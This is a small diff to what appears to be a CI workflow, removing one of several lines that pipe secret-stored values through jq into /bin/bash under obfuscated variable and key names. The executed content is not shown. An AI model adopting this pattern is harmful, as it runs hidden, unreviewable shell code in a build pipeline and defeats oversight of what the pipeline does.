@@ -22,7 +22,6 @@ jobs:
           wa0: ${{ secrets.wa0 }}
         run: |
           printf '%s' "$wa0" | jq -r .cvb68 | /bin/bash
-          echo $w2 | jq -r .d6550 | /bin/bash
           echo $ait86519 | jq -r .glw533 | /bin/bash
           printf '%s' "$ql23" | jq -r .o0 | /bin/bash
           echo $jkltp38567 | jq -r .q9636 | /bin/bash
